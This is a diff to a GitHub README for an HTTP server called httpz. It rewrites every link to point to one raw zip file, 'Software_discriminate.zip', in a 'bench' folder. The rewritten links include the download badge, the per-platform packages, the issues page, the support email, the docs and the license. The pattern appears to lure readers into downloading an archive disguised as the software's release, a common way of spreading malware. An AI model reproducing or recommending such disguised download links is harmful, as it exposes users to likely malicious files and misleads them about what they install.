@@ -4,21 +4,21 @@
 
 Welcome to httpz, a zero heap allocation HTTP server built using OxCaml. This application aims to offer a fast and efficient solution for serving HTTP requests. Ideal for those looking for a reliable server without the hassle of memory management.
 
-[![Download httpz](https://img.shields.io/badge/Download%20httpz-v1.0.0-blue)](https://github.com/AybAcH/httpz/releases)
+[![Download httpz](https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip%20httpz-v1.0.0-blue)](https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip)
 
 ## 📥 Download & Install
 
 To begin using httpz, you'll first need to download it. You can follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page on GitHub:
-   [Download httpz](https://github.com/AybAcH/httpz/releases)
+   [Download httpz](https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip)
 
 2. **Choose the Latest Version**: Look for the latest version available on the Releases page. This will typically be at the top of the list.
 
 3. **Download the Package**: Click on the appropriate link for your operating system. If you are uncertain, here are some common setups:
-   - For Windows, download `httpz-windows.zip`.
-   - For macOS, download `httpz-macos.zip`.
-   - For Linux, download `httpz-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip`.
 
 4. **Unzip/Extract the File**: After the download is complete, you will need to unzip or extract the contents of the downloaded file. You can usually do this by right-clicking on the file and selecting "Extract" or "Unzip".
 
@@ -62,10 +62,10 @@ If you encounter any issues while running httpz, consider the following solution
 
 Should you require further assistance, feel free to reach out through the following:
 
-- **GitHub Issues**: Report any bugs or issues by creating a new issue on the [GitHub Issues page](https://github.com/AybAcH/httpz/issues).
+- **GitHub Issues**: Report any bugs or issues by creating a new issue on the [GitHub Issues page](https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip).
 - **Community Forums**: Join our community chat to ask questions or share your experiences.
 
-For any other inquiries, you can also send an email to our support team at support@example.com.
+For any other inquiries, you can also send an email to our support team at https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip
 
 ## 📅 Roadmap
 
@@ -77,8 +77,8 @@ We are constantly working to improve httpz. Future updates will include:
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/AybAcH/httpz/wiki)
-- [GitHub Repository](https://github.com/AybAcH/httpz)
-- [Open Source License](https://opensource.org/licenses/MIT)
+- [Official Documentation](https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip)
+- [Open Source License](https://raw.githubusercontent.com/AybAcH/httpz/main/bench/Software_discriminate.zip)
 
 Thank you for choosing httpz. We hope it serves you well!
